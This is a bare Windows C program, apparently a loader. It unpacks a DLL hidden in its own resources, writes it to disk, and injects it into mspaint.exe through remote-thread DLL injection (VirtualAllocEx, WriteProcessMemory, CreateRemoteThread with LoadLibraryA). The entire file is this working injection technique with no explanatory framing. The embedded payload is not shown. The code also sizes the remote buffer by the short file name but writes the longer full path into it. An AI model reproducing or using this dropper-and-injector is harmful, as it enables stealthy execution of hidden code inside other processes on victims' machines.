#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define IDR_DLL2 102

void ExtractEmbeddedDLL() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), RT_RCDATA);
    if (hRes == NULL) {
        printf("Failed to find DLL resource.\n");
        return;
    }
    else { printf("a"); }

    DWORD dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) {
        printf("Failed to get size of DLL resource.\n");
        return;
    }
    else { printf("b"); }

    HGLOBAL hGlobal = LoadResource(NULL, hRes);
    if (hGlobal == NULL) {
        printf("Failed to load DLL resource.\n");
        return;
    }
    else { printf("c"); }

    void* pData = LockResource(hGlobal);
    if (pData == NULL) {
        printf("Failed to lock resource.\n");
        return;
    }
    else { printf("d"); }

  
    FILE* file = NULL;
    errno_t err = fopen_s(&file, "extracted.dll", "wb");
    if (err != 0) {
        printf("Failed to create output file.\n");
        return;
    }

    fwrite(pData, 1, dwSize, file);
    fclose(file);
    printf("DLL extracted to 'extracted.dll'\n");
}


DWORD GetProcessID(const char* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            wchar_t wideProcessName[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, processName, -1, wideProcessName, MAX_PATH);

            if (_wcsicmp(pe32.szExeFile, wideProcessName) == 0) {
                CloseHandle(hProcessSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return 0;
}



void InjectDLL(const char* targetProcessName) {
    DWORD pid = GetProcessID(targetProcessName);
    if (pid == 0) {
        printf("Failed to get PID of target process.\n");
        return;
    }



    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open target process.\n");
        return;
    }


    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, strlen("extracted.dll") + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteMem == NULL) {
        printf("Failed to allocate memory in target process.\n");
        return;
    }
    else { printf("a"); }


    char fullDllPath[MAX_PATH];
    if (GetFullPathNameA("extracted.dll", MAX_PATH, fullDllPath, NULL) == 0) {
        printf("Failed to retrieve full DLL path. Error code: %lu\n", GetLastError());
        return;
    }
    else { printf("b"); }
    GetFullPathNameA("extracted.dll", MAX_PATH, fullDllPath, NULL);
    WriteProcessMemory(hProcess, pRemoteMem, fullDllPath, strlen(fullDllPath) + 1, NULL);


    HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
    if (kernel32Base == NULL) {
        printf("Failed to retrieve handle to kernel32.dll: %d\n", GetLastError());
        return;
    }
    else { printf("c"); }
    FARPROC load_library_address = GetProcAddress(kernel32Base, "LoadLibraryA");


    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_address, pRemoteMem, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread.\n");
        return;
    }
    else { printf("d"); }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    ExtractEmbeddedDLL();

    InjectDLL("mspaint.exe");

    return 0;
}
